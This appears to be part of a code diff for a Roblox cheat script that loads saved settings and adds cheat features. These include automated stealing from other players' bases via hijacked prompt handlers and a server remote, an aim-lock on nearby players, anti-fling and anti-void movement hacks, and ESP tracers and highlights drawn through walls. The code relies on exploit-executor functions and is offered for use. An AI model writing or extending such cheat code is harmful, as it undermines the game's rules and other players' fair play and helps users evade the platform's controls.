+    if cfg.safeMode ~= nil then antiKickEnabled = cfg.safeMode
+    elseif cfg.antiKick ~= nil then antiKickEnabled = cfg.antiKick end
+    if type(cfg.aceAnimationPack) == "string" then __HH.aceSelectedAnimationPack = cfg.aceAnimationPack end
+    if cfg.bodyLockEnabled ~= nil then __HH.bodyLockEnabled = cfg.bodyLockEnabled == true end
+    if cfg.bodyLockRange ~= nil then __HH.bodyLockRange = math.clamp(tonumber(cfg.bodyLockRange) or 20, 5, 200) end
+    if cfg.antiFlingEnabled ~= nil then __HH.antiFlingEnabled = cfg.antiFlingEnabled == true end
+    if _G.HorizonStealModes then
+        if cfg.autoStealRadius ~= nil then _G.HorizonStealModes.SetRadius(cfg.autoStealRadius) end
+        if cfg.autoStealMode == "Semi" or cfg.autoStealMode == "Instant" then _G.HorizonStealModes.SetMode(cfg.autoStealMode) end
+        if cfg.autoStealEnabled ~= nil then _G.HorizonStealModes.SetEnabled(cfg.autoStealEnabled == true) end
+    end
+    __HH.aceSyncAnimationPackIndex()
+    if type(cfg.buttonVisibility) == "table" then
+        for k, v in pairs(cfg.buttonVisibility) do
+            if __HH.buttonVisibility[k] ~= nil then __HH.buttonVisibility[k] = v end
+        end
+    end
+    local function applyKey(target, saved)
+        if not saved or not target then return end
+        if saved.kb and Enum.KeyCode[saved.kb] then target.kb = Enum.KeyCode[saved.kb] else target.kb = nil end
+        if saved.gp and Enum.KeyCode[saved.gp] then target.gp = Enum.KeyCode[saved.gp] else target.gp = nil end
+    end
+    applyKey(__HH.KB.DropBrainrot, cfg.dropBrainrotKey); 
+    applyKey(__HH.KB.TPLock, cfg.tpLockKey)
+    if cfg.frameResetKey then
+        -- New Frame Reset keybind storage: preserve any rebind made in the
+        -- existing Combat row.
+        applyKey(__HH.KB.LaggerToggle, cfg.laggerToggleKey)
+        applyKey(__HH.KB.InstaReset, cfg.frameResetKey)
+    else
+        -- Migrate old Pure configs (Lagger=R, Insta Reset=G) to the Frame
+        -- layout (Frame Reset=R, Lagger=G) without moving the UI row.
+        local oldLagger = cfg.laggerToggleKey
+        if oldLagger and oldLagger.kb == "R" and not oldLagger.gp then
+            __HH.KB.LaggerToggle.kb = Enum.KeyCode.G
+            __HH.KB.LaggerToggle.gp = nil
+        else
+            applyKey(__HH.KB.LaggerToggle, oldLagger)
+        end
+        __HH.KB.InstaReset.kb = Enum.KeyCode.R
+        __HH.KB.InstaReset.gp = nil
+    end
+    applyKey(__HH.KB.AutoLeft, cfg.autoLeftKey); applyKey(__HH.KB.AutoRight, cfg.autoRightKey); applyKey(__HH.KB.TPFloor, cfg.tpFloorKey)
+    applyKey(__HH.KB.GuiHide, cfg.guiHideKey); applyKey(__HH.KB.SpeedToggle, cfg.speedToggleKey)
+    applyKey(__HH.KB.BatV2Toggle, cfg.batV2Key)
+    if cfg.selectedDevice == "PC" or cfg.selectedDevice == "MOBILE" or cfg.selectedDevice == "CONTROLLER" then
+        __HH.selectedDevice = cfg.selectedDevice
+    end
+    -- Persist immediately so first-run always has a config file on disk,
+    -- and so a freshly-loaded/pasted config is saved right away too.
+    saveConfig()
+end
+
+local function applyState()
+    if __HH.antiRagdollEnabled then __HH.stopAntiRagdoll(); __HH.startAntiRagdoll() end
+    if setAntiRagVisual then setAntiRagVisual(__HH.antiRagdollEnabled) end
+    if __HH.setInfJumpVisual then __HH.setInfJumpVisual(__HH.infJumpEnabled) end
+    if __HH.infJumpEnabled and __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end
+    if __HH.setAutoJumpBrainrotVisual then __HH.setAutoJumpBrainrotVisual(__HH.autoJumpBrainrot) end
+    if __HH.setFloatVisual then __HH.setFloatVisual(__HH.floatEnabled) end
+    if __HH.FRFloat then __HH.FRFloat.setHeight(__HH.floatHeight or 6) end
+    if __HH.floatEnabled and __HH.FRFloat then __HH.FRFloat.setEnabled(true) end
+    if __HH.medusaCounterEnabled or __HH.medusaResetEnabled then
+        setupMedusa(LP.Character)
+        if setMedusaVisual then setMedusaVisual(__HH.medusaCounterEnabled) end
+        if setMedusaResetVisual then setMedusaResetVisual(__HH.medusaResetEnabled) end
+    end
+    if __HH.batCounterEnabled then startBatCounter() end
+    if __HH.setBatCounterVisual then __HH.setBatCounterVisual(__HH.batCounterEnabled) end
+    if _G.PureSpinBot then
+        if _G.PureSpinBot.enabled and _G.PureSpinBot.start then _G.PureSpinBot.start() end
+        if _G.PureSpinBot.setVisual then _G.PureSpinBot.setVisual(_G.PureSpinBot.enabled) end
+    end
+    if __HH.tpLockEnabled then
+        if startTPLock then startTPLock() end
+        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(true) end
+    end
+    if __HH.unwalkEnabled then __HH.startUnwalk() end
+    if setUnwalkVisual then setUnwalkVisual(__HH.unwalkEnabled) end
+    if __HH.aceSelectedAnimationPack ~= "OFF" then
+        pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
+    end
+    if __HH.antiLagEnabled then enableAntiLag() end
+    if setAntiLagVisual then setAntiLagVisual(__HH.antiLagEnabled) end
+    if __HH.stretchRezEnabled then enableStretchRez() end
+    if __HH.setStretchRezVisual then __HH.setStretchRezVisual(__HH.stretchRezEnabled) end
+    if __HH.autoTPEnabled then startAutoTP() end
+    if __HH.setAutoTPVisual then __HH.setAutoTPVisual(__HH.autoTPEnabled) end
+    if __HH.batV2Enabled then toggleBatV2() end
+    if __HH.batV2SetVisual then __HH.batV2SetVisual(__HH.batV2Enabled) end
+    if _G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
+    and _G.PureMirrorTPDownSetVisual then
+        pcall(_G.PureMirrorTPDownSetVisual, _G.PureMirrorTPDown.enabled())
+    end
+    if _G.PureBatSpam and _G.PureBatSpam.enabled and _G.PureBatSpamSetVisual then
+        pcall(_G.PureBatSpamSetVisual, _G.PureBatSpam.enabled())
+    end
+    if __HH.antiDieEnabled then __HH.startAntiDie() end
+    if __HH.setAntiDieVisual then __HH.setAntiDieVisual(__HH.antiDieEnabled) end
+    if __HH.autoResetOnDeath then __HH.setupDeathReset() end
+    if __HH.setAutoResetOnDeathVisual then __HH.setAutoResetOnDeathVisual(__HH.autoResetOnDeath) end
+    if __HH.bodyLockEnabled and not __HH.batV2Enabled and not __HH.tpLockEnabled and __HH.startBodyLock then __HH.startBodyLock() end
+    if __HH.setBodyLockVisual then __HH.setBodyLockVisual(__HH.bodyLockEnabled) end
+    if __HH.setAntiFlingVisual then __HH.setAntiFlingVisual(__HH.antiFlingEnabled) end
+    refreshSpeedModeLabel()
+    
+    if __HH.currentSkyTheme and __HH.currentSkyTheme ~= "Off" then applySkyTheme(__HH.currentSkyTheme) end
+    if __HH.mainFrame and __HH.uiScaleObject then __HH.uiScaleObject.Scale = uiScaleValue end
+    if autoLeftEnabled then startAutoLeft() end
+    if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
+    if autoRightEnabled then startAutoRight() end
+    if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
+    if __HH.espEnabled and startPlayerESP then startPlayerESP() end
+    if __HH.setESPVisual then __HH.setESPVisual(__HH.espEnabled) end
+    if __HH.headlessEnabled or __HH.korbloxEnabled then
+        task.spawn(function()
+            task.wait(0.4)
+            local char = LP.Character
+            if char then
+                pcall(function()
+                    if __HH.headlessEnabled then applyHeadless(char, true) end
+                    if __HH.korbloxEnabled then applyKorblox(char, true) end
+                end)
+            end
+        end)
+    end
+    if currentAccessoryPack and currentAccessoryPack ~= "Off" then
+        task.spawn(function()
+            task.wait(0.5)
+            local char = LP.Character
+            if char and currentAccessoryPack ~= "Off" then
+                pcall(function() applyAccessoryPack(currentAccessoryPack) end)
+            end
+        end)
+    end
+    if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
+end
+
+-- ============================================
+-- VIS SEMI STEAL + BODY LOCK / FR ANTI FLING / BAKI ANTI VOID
+-- ============================================
+do
+    local P=game:GetService("Players"); local R=game:GetService("RunService"); local me=P.LocalPlayer
+    local semi={running=false,conn=nil,busy=false,radius=61,finishRange=9,data={}}
+    local desired=true; local suspended=false; local mode="Instant"
+    local function mine(plot)
+        local sign=plot and plot:FindFirstChild("PlotSign"); local y=sign and sign:FindFirstChild("YourBase")
+        return y and y:IsA("BillboardGui") and y.Enabled==true
+    end
+    local function nearest()
+        local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");if not root then return end
+        local plots=workspace:FindFirstChild("Plots");if not plots then return end
+        local best,bd,bn,bsp=nil,math.huge,nil,nil
+        for _,plot in ipairs(plots:GetChildren()) do if not mine(plot) then
+            local pods=plot:FindFirstChild("AnimalPodiums");if pods then for _,pod in ipairs(pods:GetChildren()) do
+                local base=pod:FindFirstChild("Base");local sp=base and base:FindFirstChild("Spawn")
+                if sp then local d=(sp.Position-root.Position).Magnitude;if d<=semi.radius and d<bd then
+                    for _,pr in ipairs(sp:GetDescendants()) do local ac=(pr:IsA("ProximityPrompt") and (pr.ActionText or ""):lower()) or ""
+                        if ac:find("steal") or ac:find("grab") then best,bd,bn,bsp=pr,d,pod.Name,sp;break end
+                    end
+                end end
+            end end
+        end end
+        return best,bn,bsp
+    end
+    local function valid() return desired and not suspended and mode=="Semi" and semi.running end
+    local function execute(pr,pod,sp)
+        if semi.busy or not valid() then return end
+        if not semi.data[pr] then
+            semi.data[pr]={hold={},trigger={},ready=true}
+            pcall(function()
+                if getconnections then
+                    for _,c in ipairs(getconnections(pr.PromptButtonHoldBegan)) do if c.Function then table.insert(semi.data[pr].hold,c.Function) end end
+                    for _,c in ipairs(getconnections(pr.Triggered)) do if c.Function then table.insert(semi.data[pr].trigger,c.Function) end end
+                end
+            end)
+        end
+        local data=semi.data[pr];if not data.ready then return end
+        data.ready=false;semi.busy=true
+        task.spawn(function()
+            pcall(function()
+                -- Exact Vis start: call the prompt's captured hold handlers.
+                if #data.hold>0 then for _,f in ipairs(data.hold) do task.spawn(f) end else pr:InputHoldBegin() end
+                local started=tick();local duration=1.3;local stopTime=.96
+                while valid() and pr.Parent and tick()-started<stopTime do
+                    local pct=math.clamp((tick()-started)/duration,0,.73)
+                    if _G.StealBar then _G.StealBar.SetState("SEMI");_G.StealBar.SetProgress(pct,"SEMI") end
+                    task.wait()
+                end
+                if not valid() or not pr.Parent then return end
+                -- Vis pause point: exactly 73% until entering its 9-stud finish radius.
+                if _G.StealBar then _G.StealBar.SetState("SEMI 73%");_G.StealBar.SetProgress(.73,"SEMI 73%") end
+                while valid() and pr.Parent do
+                    local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart")
+                    if root and sp and (root.Position-sp.Position).Magnitude<=semi.finishRange then break end
+                    if _G.StealBar then _G.StealBar.SetProgress(.73,"SEMI 73%") end
+                    task.wait()
+                end
+                if not valid() or not pr.Parent then return end
+                local fill=tick();local fillDuration=math.max(duration-stopTime,.05)
+                while valid() and pr.Parent do
+                    local fp=math.clamp((tick()-fill)/fillDuration,0,1)
+                    if _G.StealBar then _G.StealBar.SetProgress(.73+fp*.27,"SEMI") end
+                    if fp>=1 then break end
+                    task.wait()
+                end
+                if valid() and pr.Parent then
+                    if #data.trigger>0 then for _,f in ipairs(data.trigger) do task.spawn(f) end
+                    elseif fireproximityprompt then fireproximityprompt(pr)
+                    else pr:InputHoldEnd() end
+                    local re=game:GetService("ReplicatedStorage"):FindFirstChild("StealAnimal")
+                    if re and pod then re:FireServer(pod) end
+                end
+            end)
+            pcall(function() pr:InputHoldEnd() end)
+            data.ready=true;semi.busy=false
+            if _G.StealBar then _G.StealBar.Reset() end
+        end)
+    end
+    local function stopSemi()
+        semi.running=false;if semi.conn then semi.conn:Disconnect();semi.conn=nil end
+        if _G.StealBar then _G.StealBar.Reset() end
+    end
+    local function stopInstant() if _G.YousefInstantSteal then _G.YousefInstantSteal.SetEnabled(false) end end
+    local function apply()
+        stopSemi();stopInstant()
+        if not desired or suspended then return end
+        if mode=="Semi" then
+            semi.running=true;semi.conn=R.Heartbeat:Connect(function() if not semi.busy then local p,n,sp=nearest();if p then execute(p,n,sp) end end end)
+        elseif _G.YousefInstantSteal then _G.YousefInstantSteal.SetEnabled(true) end
+    end
+    _G.HorizonStealModes={
+        SetMode=function(m) mode=(m=="Semi") and "Semi" or "Instant";apply();if _G.StealBar then _G.StealBar.Reset() end end,
+        GetMode=function() return mode end,
+        SetEnabled=function(on) desired=on==true;apply();if _G.StealBar then _G.StealBar.Reset() end end,
+        GetEnabled=function() return desired end,
+        Suspend=function() suspended=true;apply() end,
+        Resume=function() suspended=false;apply() end,
+        IsSuspended=function() return suspended end,
+        SetRadius=function(v) semi.radius=math.clamp(tonumber(v) or 61,1,500);if _G.YousefInstantSteal then _G.YousefInstantSteal.SetRadius(semi.radius) end end,
+        GetRadius=function() return semi.radius end,
+    }
+    apply()
+end
+
+do
+    local P=game:GetService("Players"); local R=game:GetService("RunService"); local me=P.LocalPlayer
+    __HH.bodyLockEnabled=false; __HH.bodyLockRange=20; __HH.bodyLockConn=nil; __HH.setBodyLockVisual=nil
+    local function stopBL()
+        if __HH.bodyLockConn then __HH.bodyLockConn:Disconnect();__HH.bodyLockConn=nil end
+        local c=me.Character;local h=c and c:FindFirstChildOfClass("Humanoid");local r=c and c:FindFirstChild("HumanoidRootPart")
+        if h then h.AutoRotate=true end;if r then r.AssemblyAngularVelocity=Vector3.zero end
+    end
+    __HH.stopBodyLock=stopBL
+    __HH.startBodyLock=function()
+        stopBL(); if not __HH.bodyLockEnabled or __HH.batV2Enabled or __HH.tpLockEnabled then return end
+        __HH.bodyLockConn=R.RenderStepped:Connect(function()
+            if __HH.batV2Enabled or __HH.tpLockEnabled then return end
+            local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");local hum=c and c:FindFirstChildOfClass("Humanoid");if not root or not hum then return end
+            local target,dist=nil,math.huge
+            for _,p in ipairs(P:GetPlayers()) do if p~=me and p.Character then local tr=p.Character:FindFirstChild("HumanoidRootPart");local th=p.Character:FindFirstChildOfClass("Humanoid")
+                if tr and th and th.Health>0 then local d=(tr.Position-root.Position).Magnitude;if d<dist then target,dist=tr,d end end end end
+            if not target or dist>__HH.bodyLockRange then hum.AutoRotate=true;return end
+            hum.AutoRotate=false
+            local tv=target.AssemblyLinearVelocity
+            local predicted=target.Position+tv*math.clamp(tv.Magnitude/80,.08,.35)
+            local head=target.Parent and target.Parent:FindFirstChild("Head")
+            local targetY=head and head.Position.Y or target.Position.Y
+            local correction=math.clamp((targetY-(root.Position.Y+(hum.HipHeight or 0)))*.15,-1.5,1.5)
+            local flat=Vector3.new(predicted.X,root.Position.Y+correction,predicted.Z)
+            if (flat-root.Position).Magnitude>.1 then
+                local goal=CFrame.lookAt(root.Position,flat);local diff=root.CFrame:Inverse()*goal
+                local _,ry,_=diff:ToEulerAnglesXYZ();ry=math.clamp(ry,-2.5,2.5)
+                root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(Vector3.new(0,ry*42,0))
+            end
+        end)
+    end
+
+    __HH.antiFlingEnabled=false; __HH.setAntiFlingVisual=nil
+    local fixing=false;local untilT=0
+    R.Heartbeat:Connect(function()
+        if not __HH.antiFlingEnabled or __HH.batV2Enabled or __HH.tpLockEnabled or __HH.dropActive then fixing=false;return end
+        local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");if not root then return end
+        if fixing then root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero;if os.clock()>=untilT then fixing=false end
+        elseif root.AssemblyLinearVelocity.Magnitude>=140 or root.AssemblyAngularVelocity.Magnitude>=90 then fixing=true;untilT=os.clock()+.15 end
+    end)
+
+    __HH.antiVoidTPBat=false;local hist={}
+    R.Heartbeat:Connect(function()
+        if not __HH.antiVoidTPBat then hist={};return end
+        local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");if not root then return end
+        local now=os.clock();table.insert(hist,{t=now,p=root.Position});while #hist>0 and now-hist[1].t>2 do table.remove(hist,1) end
+        local old=nil;for i=#hist,1,-1 do if hist[i].t<=now-.6 then old=hist[i].p;break end end
+        if old and (root.Position-old).Magnitude>150 then root.CFrame=CFrame.new(old);root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero;hist={} end
+    end)
+end
+
+-- ============================================
+-- ESP (UVA DUELS port): mini avatar billboard + highlight box + tracer lines
+-- ============================================
+do
+    local playerData = {}
+    local playerSPConnections = {}
+    local playerSPRenderConn = nil
+    local playerSPRunning = false
+
+    local ESP_CONFIG = {
+        CircleSize = 32,
+        AvatarOffset = 2.5,
+        LineColor = Color3.fromRGB(80, 140, 255),
+        LineThickness = 1.5,
+        BoxColor = Color3.fromRGB(105, 215, 255),
+        BoxThickness = 2,
+        GlowColor = Color3.fromRGB(175, 235, 255),
+        GlowSize = 0.65,
+        GlowTransparency = 0.05,
+        FontSize = 10,
+        NameOffset = 2,
+    }
+
+    -- clean leftovers from previous versions / previous runs
+    pcall(function()
+        for _, d in ipairs(workspace:GetDescendants()) do
+            if d.Name == "VoidedESP" or d.Name == "VoidedESPTag"
+                or d.Name == "MiniAvatarESP" or d.Name == "RedESPBox" then
+                d:Destroy()
+            end
+        end
+        local function sweep(root)
+            if not root then return end
+            for _, g in ipairs(root:GetChildren()) do
+                if string.sub(g.Name, 1, 11) == "HorizonESP_" or string.sub(g.Name, 1, 8) == "DiceESP_" then
+                    g:Destroy()
+                end
+            end
+        end
+        sweep(game:GetService("CoreGui"))
+        sweep(LP:FindFirstChildOfClass("PlayerGui"))
+    end)
+
+    local function createPlayerSPBillboard(player, char)
+        if not char then return end
+        local head = char:FindFirstChild("Head")
+        if not head then return end
+
+        local existing = head:FindFirstChild("MiniAvatarESP")
+        if existing then existing:Destroy() end
+
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "MiniAvatarESP"
+        billboard.Size = UDim2.new(0, 80, 0, 110)
+        billboard.StudsOffset = Vector3.new(0, ESP_CONFIG.AvatarOffset, 0)
+        billboard.AlwaysOnTop = true
+        billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        billboard.Parent = head
+
+        local container = Instance.new("Frame", billboard)
+        container.Size = UDim2.new(1, 0, 1, 0)
+        container.BackgroundTransparency = 1
+        container.ClipsDescendants = false
+
+        local circleSize = ESP_CONFIG.CircleSize
+        local radius = circleSize / 2
+
+        local circleBg = Instance.new("Frame", container)
+        circleBg.Size = UDim2.new(0, circleSize, 0, circleSize)
+        circleBg.Position = UDim2.new(0.5, -radius, 0, 0)
+        circleBg.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+        circleBg.BackgroundTransparency = 0.3
+        circleBg.BorderSizePixel = 0
+        circleBg.ZIndex = 1
+
+        local corner = Instance.new("UICorner", circleBg)
+        corner.CornerRadius = UDim.new(1, 0)
+
+        local stroke = Instance.new("UIStroke", circleBg)
+        stroke.Color = Color3.fromRGB(80, 140, 255)
+        stroke.Thickness = 1.5
+        stroke.Transparency = 0.5
+
+        local avatarImage = Instance.new("ImageLabel", circleBg)
+        avatarImage.Size = UDim2.new(1, -4, 1, -4)
+        avatarImage.Position = UDim2.new(0, 2, 0, 2)
+        avatarImage.BackgroundTransparency = 1
+        avatarImage.ZIndex = 2
+
+        local avatarUrl = string.format(
+            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+            player.UserId
+        )
+        avatarImage.Image = avatarUrl
+
+        local nameLabel = Instance.new("TextLabel", container)
+        nameLabel.Size = UDim2.new(1, 0, 0, 20)
+        nameLabel.Position = UDim2.new(0, 0, 0, circleSize + ESP_CONFIG.NameOffset)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = player.DisplayName or player.Name
+        nameLabel.TextColor3 = Color3.fromRGB(80, 140, 255)
+        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        nameLabel.TextStrokeTransparency = 0.3
+        nameLabel.Font = Enum.Font.GothamBold
+        nameLabel.TextSize = ESP_CONFIG.FontSize
+        nameLabel.TextScaled = false
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
+        nameLabel.ZIndex = 3
+
+        return billboard
+    end
+
+    local function createPlayerSPBox(char)
+        if not char then return end
+        local existing = char:FindFirstChild("RedESPBox")
+        if existing then existing:Destroy() end
+
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "RedESPBox"
+        highlight.Adornee = char
+        highlight.FillColor = ESP_CONFIG.BoxColor
+        highlight.OutlineColor = Color3.fromRGB(0,0,0)
+        highlight.FillTransparency = 0.7
+        highlight.OutlineTransparency = 0.1
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        highlight.Parent = char
+        return highlight
+    end
+
+    -- Small light-blue point that stays directly under every ESP target (non-Neon).
+    local function createPlayerSPGlow(player)
+        local old = workspace:FindFirstChild("HorizonESPGlow_" .. tostring(player.UserId))
+        if old then old:Destroy() end
+
+        local glow = Instance.new("Part")
+        glow.Name = "HorizonESPGlow_" .. tostring(player.UserId)
+        glow.Shape = Enum.PartType.Ball
+        glow.Size = Vector3.new(ESP_CONFIG.GlowSize, ESP_CONFIG.GlowSize, ESP_CONFIG.GlowSize)
+        glow.Anchored = true
+        glow.CanCollide = false
+        glow.CanTouch = false
+        glow.CanQuery = false
+        glow.CastShadow = false
+        glow.Material = Enum.Material.SmoothPlastic
+        glow.Color = ESP_CONFIG.GlowColor
+        glow.Transparency = ESP_CONFIG.GlowTransparency
+        glow.CFrame = CFrame.new(0, -10000, 0)
+        glow.Parent = workspace
+
+        local light = Instance.new("PointLight", glow)
+        light.Name = "HorizonESPBlueLight"
+        light.Color = ESP_CONFIG.GlowColor
+        light.Brightness = 2.5
+        light.Range = 9
+        light.Shadows = false
+        return glow
+    end
+
+    local function setupPlayerESP(player)
+        if player == LP then return end
+        if playerData[player] then return end
+
+        local data = {
+            Line = nil,
+            Billboard = nil,
+            Box = nil,
+            Glow = nil,
+            Connections = {},
+        }
+
+        local line = nil
+        if Drawing and type(Drawing.new) == "function" then
+            line = Drawing.new("Line")
+            line.Color = ESP_CONFIG.LineColor
+            line.Thickness = ESP_CONFIG.LineThickness
+            line.Transparency = 0.6
+            line.Visible = false
+        end
+        data.Line = line
+        data.Glow = createPlayerSPGlow(player)
+
+        local charAddedConn = player.CharacterAdded:Connect(function(char)
+            task.wait(0.3)
+            local bill = createPlayerSPBillboard(player, char)
+            if bill then data.Billboard = bill end
+            local box = createPlayerSPBox(char)
+            if box then data.Box = box end
+
+            char:GetPropertyChangedSignal("Parent"):Connect(function()
+                if not char.Parent then
+                    if data.Billboard then pcall(function() data.Billboard:Destroy() end); data.Billboard = nil end
+                    if data.Box then pcall(function() data.Box:Destroy() end); data.Box = nil end
+                end
+            end)
+        end)
+
+        table.insert(data.Connections, charAddedConn)
+
+        local nameChangedConn = player:GetPropertyChangedSignal("DisplayName"):Connect(function()
+            if data.Billboard then
+                local nameLabel = data.Billboard:FindFirstChildWhichIsA("TextLabel")
+                if nameLabel then nameLabel.Text = player.DisplayName end
+            end
+        end)
+        table.insert(data.Connections, nameChangedConn)
+
+        if player.Character then
+            task.wait(0.2)
+            local bill = createPlayerSPBillboard(player, player.Character)
+            if bill then data.Billboard = bill end
+            local box = createPlayerSPBox(player.Character)
+            if box then data.Box = box end
+        end
+
+        playerData[player] = data
+    end
+
+    local function removePlayerESP(player)
+        if playerData[player] then
+            if playerData[player].Line then
+                pcall(function() playerData[player].Line:Remove() end)
+            end
+            if playerData[player].Billboard then
+                pcall(function() playerData[player].Billboard:Destroy() end)
+            end
+            if playerData[player].Box then
+                pcall(function() playerData[player].Box:Destroy() end)
+            end
+            if playerData[player].Glow then
+                pcall(function() playerData[player].Glow:Destroy() end)
+            end
+            for _, conn in ipairs(playerData[player].Connections or {}) do
+                pcall(function() conn:Disconnect() end)
+            end
+            playerData[player] = nil
+        end
+    end
+
+    local function updatePlayerSPLines()
+        local myChar = LP.Character
+        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+
+        if not myHrp then
+            for _, data in pairs(playerData) do
+                if data.Line then data.Line.Visible = false end
+            end
+            return
+        end
+
+        local myPos, visible = workspace.CurrentCamera:WorldToViewportPoint(myHrp.Position)
+        if not visible then
+            for _, data in pairs(playerData) do
+                if data.Line then data.Line.Visible = false end
+            end
+            return
+        end
+
+        for player, data in pairs(playerData) do
+            local char = player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hrp then
+                -- Keep the light point attached under the actual character,
+                -- not on the floor. It follows flight, falling and dead bodies.
+                if data.Glow and data.Glow.Parent then
+                    local bottomOffset = (hrp.Size.Y * 0.5) + 2.35
+                    data.Glow.CFrame = CFrame.new(hrp.Position - Vector3.new(0, bottomOffset, 0))
+                    data.Glow.Transparency = ESP_CONFIG.GlowTransparency
+                end
+                local targetPos, visible2 = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+                if data.Line then
+                    if visible2 then
+                        data.Line.Visible = true
+                        data.Line.From = Vector2.new(myPos.X, myPos.Y)
+                        data.Line.To = Vector2.new(targetPos.X, targetPos.Y)
+                    else
+                        data.Line.Visible = false
+                    end
+                end
+            else
+                if data.Line then data.Line.Visible = false end
+                if data.Glow and data.Glow.Parent then
+                    data.Glow.CFrame = CFrame.new(0, -10000, 0)
+                end
+            end
+        end
+    end
+
+    function startPlayerESP()
+        if playerSPRunning then return end
+        playerSPRunning = true
+        __HH.espEnabled = true
+
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LP then
+                setupPlayerESP(player)
+            end
+        end
+
+        if playerSPRenderConn then playerSPRenderConn:Disconnect() end
+        playerSPRenderConn = RunService.RenderStepped:Connect(function()
+            pcall(updatePlayerSPLines)
+        end)
+
+        local playerAddedConn = Players.PlayerAdded:Connect(function(p)
+            if p ~= LP then setupPlayerESP(p) end
+        end)
+        table.insert(playerSPConnections, playerAddedConn)
+
+        local playerRemovingConn = Players.PlayerRemoving:Connect(function(p)
+            removePlayerESP(p)
+        end)
+        table.insert(playerSPConnections, playerRemovingConn)
+
+        local charAddedConn = LP.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            for player, data in pairs(playerData) do
+                if player.Character then
+                    local bill = createPlayerSPBillboard(player, player.Character)
+                    if bill then
+                        if data.Billboard then pcall(function() data.Billboard:Destroy() end) end
+                        data.Billboard = bill
+                    end
+                    local box = createPlayerSPBox(player.Character)
+                    if box then
+                        if data.Box then pcall(function() data.Box:Destroy() end) end
+                        data.Box = box
+                    end
+                end
+            end
+        end)
+        table.insert(playerSPConnections, charAddedConn)
+    end
+
+    function stopPlayerESP()
+        if not playerSPRunning then return end
+        playerSPRunning = false
+        __HH.espEnabled = false
+
+        if playerSPRenderConn then
+            playerSPRenderConn:Disconnect()
+            playerSPRenderConn = nil
+        end
+
+        for _, conn in ipairs(playerSPConnections) do
+            pcall(function() conn:Disconnect() end)
+        end
+        playerSPConnections = {}
+
+        for player, data in pairs(playerData) do
+            removePlayerESP(player)
+        end
+        playerData = {}
+    end
+end
+
+-- ============================================
+-- AVATAR (Nexus port): Headless + Korblox (client-side cosmetics)
+-- ============================================
+local HEADLESS_MESH_ID  = "rbxassetid://1095708"
+local KORBLOX_MESH_ID   = "rbxassetid://101851696"
+local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
+local cosmeticState = setmetatable({}, {__mode = "k"})
+
+function applyHeadless(char, enabled)
+    local head = char and char:FindFirstChild("Head"); if not head then return end
+    local state = cosmeticState[char] or {}; cosmeticState[char] = state
+    if enabled then
+        if state.headTransparency == nil then
+            state.headTransparency = head.Transparency; state.headCanCollide = head.CanCollide
+            local face = head:FindFirstChild("face"); state.face = face and face:Clone() or nil
+        end
+        head.Transparency = 1; head.CanCollide = false
+        local face = head:FindFirstChild("face"); if face then face:Destroy() end
+        local old = head:FindFirstChild("HorizonHeadlessMesh"); if old then old:Destroy() end
+        local mesh = Instance.new("SpecialMesh", head)
+        mesh.Name = "HorizonHeadlessMesh"; mesh.MeshType = Enum.MeshType.FileMesh
+        mesh.MeshId = HEADLESS_MESH_ID; mesh.Scale = Vector3.new(.001, .001, .001)
+    else
+        local mesh = head:FindFirstChild("HorizonHeadlessMesh"); if mesh then mesh:Destroy() end
+        if state.headTransparency ~= nil then
+            head.Transparency = state.headTransparency; head.CanCollide = state.headCanCollide
+            if state.face and not head:FindFirstChild("face") then state.face:Clone().Parent = head end
+            state.headTransparency = nil; state.headCanCollide = nil; state.face = nil
+        end
+    end
+end
+
+function applyKorblox(char, enabled)
+    local hum = char and char:FindFirstChildOfClass("Humanoid"); if not hum then return end
+    local state = cosmeticState[char] or {}; cosmeticState[char] = state
+    if hum.RigType == Enum.HumanoidRigType.R6 then
+        local leg = char:FindFirstChild("Right Leg"); if not leg then return end
+        if enabled then
+            if not state.r6LegColor then
+                state.r6LegColor = leg.Color; state.r6Meshes = {}
+                for _, v in ipairs(leg:GetChildren()) do
+                    if v:IsA("SpecialMesh") or v:IsA("CharacterMesh") then
+                        table.insert(state.r6Meshes, v:Clone()); v:Destroy()
+                    end
+                end
+            end
+            leg.Color = Color3.fromRGB(64, 64, 64)
+            local old = leg:FindFirstChild("HorizonKorbloxMesh"); if old then old:Destroy() end
+            local mesh = Instance.new("SpecialMesh", leg)
+            mesh.Name = "HorizonKorbloxMesh"; mesh.MeshType = Enum.MeshType.FileMesh
+            mesh.MeshId = KORBLOX_MESH_ID; mesh.TextureId = KORBLOX_TEXTURE_ID
+        else
+            local mesh = leg:FindFirstChild("HorizonKorbloxMesh"); if mesh then mesh:Destroy() end
+            if state.r6LegColor then leg.Color = state.r6LegColor end
